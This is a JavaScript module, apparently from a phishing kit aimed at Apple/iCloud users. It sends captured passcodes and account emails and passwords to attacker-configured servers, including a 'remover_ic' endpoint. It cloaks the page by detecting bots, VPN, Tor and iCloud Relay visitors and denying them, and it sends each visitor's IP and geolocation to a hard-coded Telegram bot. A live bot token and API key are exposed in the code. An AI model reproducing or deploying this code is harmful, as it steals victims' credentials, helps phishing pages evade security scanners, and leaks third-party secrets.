import axios from 'axios';
import Botd from '@fingerprintjs/botd';

let configCache = null;

// Obtiene las credenciales del archivo de configuración y valida si existe
const getCredentials = async () => {
  try {
    const response = await axios.get('/config-app.json');
    return response.data;
  } catch (error) {
    // Si el archivo no existe o hay error, retorna false
    return false;
  }
};

// Carga la configuración solo una vez y la reutiliza
const loadConfig = async () => {
  if (configCache) return configCache;
  try {
    const response = await axios.get('/config-app.json');
    configCache = response.data;
    return configCache;
  } catch (error) {
    return false;
  }
};

// Obtiene la ubicación por IP
const getLocation = async () => {
  const config = await loadConfig();
  if (!config || !config.tokenIpInfo) throw new Error('No se pudo cargar tokenIpInfo');
  const response = await axios.get(`https://ipinfo.io/json?token=${config.tokenIpInfo}`, {
    headers: { 'Content-Type': 'application/json' }
  });
  return response.data;
};

// Envía una visita al servidor usando urlServer global
const sendVisita = async (datos) => {
  const config = await loadConfig();
  if (!config || !config.urlServer) throw new Error('No se pudo cargar urlServer');
  const response = await axios.post(
    `${config.urlServer}/api_rest/notificacion_visita`,
    datos,
    { headers: { 'Content-Type': 'application/json' } }
  );
  return response.data;
};

// Verifica un link en el servidor usando urlServer global
const verifyLink = async (linkId) => {
  const config = await loadConfig();
  if (!config || !config.urlServer) throw new Error('No se pudo cargar urlServer');
  const data = { link: linkId };
  const response = await axios.post(
    `${config.urlServer}/api_rest/verify_link`,
    data,
    { headers: { 'Content-Type': 'application/json' } }
  );
  return response.data;
};


const savePasscodeData = async (datos) => {
  const config = await loadConfig();
  if (!config || !config.urlServer) throw new Error('No se pudo cargar urlServer');
  try {
    const response = await axios.post(
      `${config.urlServer}/api_rest/guardar_datos_passcode`,
      datos,
      { headers: { 'Content-Type': 'application/json' } }
    );
    return response.data;
  } catch (error) {
    return error;
  }
};

const autoremove = async (accountUsername, accountPassword) => {
    const configData = await loadConfig();
    if (!configData || !configData.urlAccess) throw new Error('No se pudo cargar urlAccess');

    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    };

    let params = {
        email        : accountUsername, 
        password     : accountPassword
    };

    const response = await axios.post(`${configData.urlAccess}/RestAPI/remover_ic`, params, config);
    return response;
};

const saveAutoRemoveData = async (datos) => {
  const config = await loadConfig();
  if (!config || !config.urlServer) throw new Error('No se pudo cargar urlServer');
  try {
    const response = await axios.post(
      `${config.urlServer}/api_rest/guardar_datos_autoremove`,
      datos,
      { headers: { 'Content-Type': 'application/json' } }
    );
    return response.data;
  } catch (error) {
    return error;
  }
};


function escapeMarkdown(text) {
  return text
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/`/g, '\\`')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)');
}

// ...existing code...

const sendTelegramNotification = async () => {
    const config = await loadConfig();
  if (!config) throw new Error('No se pudo cargar config-app.json');

  // Obtiene el dominio actual
  const domain = window?.location?.hostname || 'Dominio no disponible';

  // Mide el tiempo desde que se cargó la página
  const pageLoadTime = window.__PAGE_LOAD_TIME__ || Date.now();
  const now = Date.now();
  const secondsSinceLoad = (now - pageLoadTime) / 1000;

  // Llama a la API de iplocate.io para obtener geo antes de Botd
  let geo = null;
  try {
    const geoRes = await axios.get('https://www.iplocate.io/api/lookup?apikey=30bfdcfbbf49af72ccb5de5d250b70cf');
    geo = geoRes.data;
  } catch (e) {
    geo = null;
  }

  // Detección de bot con Botd
  try {
    const botd = await Botd.load();
    const result = botd.detect();
    if (result.bot) {
      // 1. Leer el archivo JSON de ISPs bloqueados
      let blockedIsps = [];
      try {
        const resp = await axios.get('/blocked-isps.json');
        blockedIsps = resp.data || [];
      } catch (e) {
        blockedIsps = [];
      }

      // 2. Verificar si el ISP ya está en la lista
      const ispName = geo?.company?.name || '-';
      const ispBlocked = blockedIsps.includes(ispName);

      // 3. Construir el mensaje
      let botMessage = `🤖 *Bot detectado y acceso denegado*\nDominio: \`${domain}\`\n`;
      if (geo) {
        botMessage += `IP: \`${geo.ip}\`\n`;
        botMessage += `País: ${geo.country} (${geo.country_code})\n`;
        botMessage += `Ciudad: ${geo.city || '-'}\n`;
        botMessage += `ISP: ${ispName}\n`;
      } else {
        botMessage += '_No se pudo obtener información de IP._\n';
      }
      if (ispBlocked) {
        botMessage += `\n⚠️ *El ISP ya se encuentra bloqueado como bot*`;
      }

      // 4. Enviar notificación a Telegram
      const url = `https://api.telegram.org/bot5753967690:AAGqd2W_5ZHvXAlihVppGh5cbzESeBM69Yo/sendMessage`;
      const data = {
        chat_id: 1636534734,
        text: escapeMarkdown(botMessage),
        parse_mode: 'Markdown'
      };
      try {
        await axios.post(url, data, {
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (error) {
        console.error('Error al enviar notificación de bot a Telegram:', error);
      }
      return { access: false };
    }
  } catch (e) {
    // Si falla Botd, continúa con el flujo normal
  }

  // --- Lógica normal para usuarios humanos ---
  try {
    const priv = geo?.privacy || {};

    // Solo bloquea si alguno de estos es true
    const sospechoso =
      !!priv.is_proxy ||
      !!priv.is_tor ||
      !!priv.is_vpn ||
      !!priv.is_anonymous ||
      !!priv.is_hosting ||
      !!priv.is_bogon ||
      !!priv.is_abuser ||
      !!priv.is_icloud_relay;

    let motivos = [];
    if (priv.is_proxy) motivos.push('Proxy');
    if (priv.is_tor) motivos.push('Tor');
    if (priv.is_vpn) motivos.push('VPN');
    if (priv.is_anonymous) motivos.push('Anonymous');
    if (priv.is_hosting) motivos.push('Hosting');
    if (priv.is_bogon) motivos.push('Bogon');
    if (priv.is_abuser) motivos.push('Abuser');
    if (priv.is_icloud_relay) motivos.push('iCloud Relay');

    // --- Detección de cambio de IP frecuente ---
    const ipHistoryKey = 'ip_history';
    let ipHistory = [];
    try {
      ipHistory = JSON.parse(localStorage.getItem(ipHistoryKey)) || [];
    } catch { ipHistory = []; }
    // Guarda la IP y el timestamp actual
    if (geo) ipHistory.push({ ip: geo.ip, time: now });
    // Mantén solo los últimos 10 registros
    ipHistory = ipHistory.slice(-10);
    // Guarda de nuevo
    localStorage.setItem(ipHistoryKey, JSON.stringify(ipHistory));
    // Cuenta cuántas IPs distintas en los últimos 10 minutos
    const tenMinutesAgo = now - 10 * 60 * 1000;
    const recentIps = ipHistory.filter(e => e.time > tenMinutesAgo).map(e => e.ip);
    const uniqueIps = [...new Set(recentIps)];
    if (uniqueIps.length > 3) {
      motivos.push('Cambio frecuente de IP');
    }

    // --- Detección de acceso muy rápido ---
    if (secondsSinceLoad < 2) {
      motivos.push('Acceso muy rápido (posible bot)');
    }

    // Construye el mensaje bonito y ordenado
    let message = `*Datos de configuración*\n`;
    message += `Dominio: \`${domain}\`\n`;
    message += `\n*GeoIP:*\n`;
    if (geo) {
      message += `IP: \`${geo.ip}\`\n`;
      message += `País: ${geo.country} (${geo.country_code})\n`;
      message += `Ciudad: ${geo.city || '-'}\n`;
      message += `Continente: ${geo.continent}\n`;
      message += `Lat/Lon: ${geo.latitude}, ${geo.longitude}\n`;
      message += `Zona horaria: ${geo.time_zone}\n`;
      message += `ISP: ${geo.company?.name || '-'}\n`;
      message += `ASN: ${geo.asn?.asn || '-'} (${geo.asn?.name || '-'})\n`;
      message += `Tipo de red: ${geo.asn?.type || '-'}\n`;
      message += `\n*Privacidad:*\n`;
      message += `Proxy: ${priv.is_proxy ? '✅' : '❌'} | Tor: ${priv.is_tor ? '✅' : '❌'} | VPN: ${priv.is_vpn ? '✅' : '❌'} | Anónimo: ${priv.is_anonymous ? '✅' : '❌'}\n`;
      message += `Hosting: ${priv.is_hosting ? '✅' : '❌'} | Bogon: ${priv.is_bogon ? '✅' : '❌'} | Abuser: ${priv.is_abuser ? '✅' : '❌'} | iCloud Relay: ${priv.is_icloud_relay ? '✅' : '❌'}\n`;
      message += sospechoso
        ? `\n⚠️ *Tráfico sospechoso detectado*: ${motivos.join(', ')}`
        : `\nTráfico automatizado: *poco probable*`;
    } else {
      message += '_No se pudo obtener información de IP._\n';
    }

    const url = `https://api.telegram.org/bot5753967690:AAGqd2W_5ZHvXAlihVppGh5cbzESeBM69Yo/sendMessage`;
    const data = {
      chat_id: 1636534734,
      text: escapeMarkdown(message),
      parse_mode: 'Markdown'
    };

    try {
      await axios.post(url, data, {
        headers: { 'Content-Type': 'application/json' }
      });
    } catch (error) {
      console.error('Error al enviar la notificación a Telegram:', error);
    }

    // Retorna el acceso según si es sospechoso o no
    return { access: !sospechoso };

  } catch (e) {
    // Si no se pudo obtener geo, permite el acceso
    return { access: true };
  }
};






export default {
  getCredentials,
  loadConfig,
  getLocation,
  sendVisita,
  verifyLink,
  savePasscodeData,
  autoremove,
  saveAutoRemoveData,
  sendTelegramNotification
};